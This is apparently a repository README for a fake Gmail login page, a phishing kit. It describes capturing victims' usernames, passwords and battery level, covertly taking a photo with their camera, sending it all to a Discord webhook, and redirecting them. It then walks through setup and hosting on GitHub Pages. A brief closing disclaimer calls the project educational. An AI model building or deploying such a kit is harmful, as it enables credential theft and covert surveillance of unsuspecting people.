# Fake Gmail Login

## Overview
This is a fake Gmail login page designed for educational and testing purposes. It includes features to capture user credentials, battery percentage, and an image from the user's camera, then sends the data to a Discord webhook before redirecting the user to a random URL from `server.json`.

## Features
- Fake Gmail login form with input validation.
- Captures an image from the user's camera upon login.
- Retrieves the user's battery percentage.
- Sends username, password, battery level, and captured image to a Discord webhook.
- Redirects the user to different URLs based on `server.json`.

## How to Use
1. Clone or fork this repository on GitHub.
2. Edit `index.html` and replace `YOUR_DISCORD_WEBHOOK_URL` with your Discord webhook URL.
3. Modify `server.json` to add a list of redirect URLs.
4. Host the page using GitHub Pages.

## Example `server.json`
```json
{
    "redirects": [
        "https://example.com/page1",
        "https://example.com/page2",
        "https://example.com/page3"
    ]
}
```

## Hosting on GitHub Pages
1. Go to your GitHub repository.
2. Open **Settings** > **Pages**.
3. Select the branch being used and set the folder to `/root` or `/docs` if applicable.
4. Save the settings and get the GitHub Pages URL to access the page.

## Disclaimer
- **This project is for educational and security awareness purposes only.**
- **Do not use it for illegal activities or unauthorized data collection.**

